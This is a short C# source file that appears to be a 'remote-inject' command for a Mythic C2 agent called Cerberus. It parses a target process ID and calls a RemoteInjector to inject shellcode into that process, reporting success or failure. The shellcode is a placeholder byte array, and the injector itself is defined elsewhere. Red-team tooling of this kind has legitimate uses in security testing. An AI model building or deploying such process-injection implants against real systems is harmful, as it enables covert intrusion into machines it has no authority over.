using Models.Tasks;

namespace Injection
{
    public class RemoteInject : CerberusCommand
    {
        public override string Name => "remote-inject";

        public override MythicTaskResult Execute(MythicTask task)
        {
            MythicTaskResult result;

            var FileBytes = new byte[10];
            var Arguments = task.parameters.Split(' ');

            if (!int.TryParse(Arguments[0], out var pid))
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Failed to parse PID",
                    completed = true,
                    status = "Error",
                    error = "Failed to parse PID"
                };

                return result;
            }
                

            var injector = new RemoteInjector();
            var success = injector.Inject(FileBytes, pid);

            if (success)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Shellcode injected",
                    completed = true,
                    status = "success",
                };
            }
            else
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Failed to inject shellcode",
                    completed = true,
                    status = "Error",
                    error = "Failed to inject shellcode"
                };
            }

            return result;
        }
    }
}
